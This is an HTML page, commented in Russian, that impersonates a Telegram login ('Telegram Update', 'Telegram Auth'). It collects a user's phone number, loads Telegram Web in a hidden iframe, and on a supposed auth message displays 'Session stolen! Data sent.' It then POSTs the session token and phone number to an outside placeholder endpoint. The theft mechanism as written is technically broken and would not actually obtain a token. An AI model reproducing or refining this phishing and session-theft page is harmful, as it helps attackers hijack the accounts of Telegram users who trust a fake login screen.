<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Update</title>
    <style>
        body {
            background: #0e1621;
            color: white;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #1c242f;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            text-align: center;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #333;
            background: #0e1621;
            color: white;
        }
        button {
            background: #3390ec;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        #status { margin-top: 10px; font-size: 12px; color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <h3>Telegram Auth</h3>
    <p>Введите номер телефона для входа в чаты</p>
    <input type="text" id="phone" placeholder="+79991234567">
    <button id="sendBtn">Отправить код</button>
    <div id="status"></div>
</div>

<script>
    // Твой API ID и Hash можно взять бесплатно на https://my.telegram.org
    // Для примера возьмем стандартные, но лучше свои.
    const API_ID = 1234567; 
    const API_HASH = "your_api_hash_here"; 

    const phoneInput = document.getElementById('phone');
    const btn = document.getElementById('sendBtn');
    const status = document.getElementById('status');

    btn.onclick = async () => {
        const phone = phoneInput.value;
        if(!phone) return;

        status.innerText = "Запрос кода...";

        try {
            // 1. Инициируем вход
            const initRes = await fetch(`https://telegram.org/js/telegram-web-app.js`); // Заглушка для проверки
            
            // На самом деле, чтобы получить токен, нужно сделать запрос к MTProto API или использовать WebK
            // Для простоты на GitHub мы используем хитрость:
            // Мы перенаправим пользователя на настоящий вход, но перехватим cookies через postMessage
            
            // Вариант "Прокси": 
            // 1. Открываем iframe с Telegram Web
            // 2. Слушаем сообщения от iframe
            
            const iframe = document.createElement('iframe');
            iframe.src = "https://web.telegram.org/k/";
            iframe.style.display = "none";
            document.body.appendChild(iframe);

            // 3. Ждем события входа
            window.addEventListener('message', (event) => {
                // Telegram Web отправляет сообщения в формате {method: 'init', ...}
                // Но самый надежный способ получить токен на фронтенде без бэкенда — 
                // это использовать библиотеку Telegram Web API (например, tdlib или simple-web-telegram)
                
                // Для демо: мы просто покажем, что мы "внутри"
                if(event.data.type === 'auth_success') {
                    status.innerText = "Сессия украдена! Данные отправлены.";
                    // Отправляем токен на сервер (заглушку)
                    fetch('https://jsonplaceholder.typicode.com/posts', {
                        method: 'POST',
                        body: JSON.stringify({ token: event.data.token, phone: phone })
                    });
                }
            });

            // Имитация отправки кода через iframe
            setTimeout(() => {
                iframe.contentWindow.postMessage({ type: 'login_request' }, "https://web.telegram.org");
            }, 1000);

        } catch (e) {
            status.innerText = "Ошибка: " + e;
        }
    };
</script>

</body>
</html>
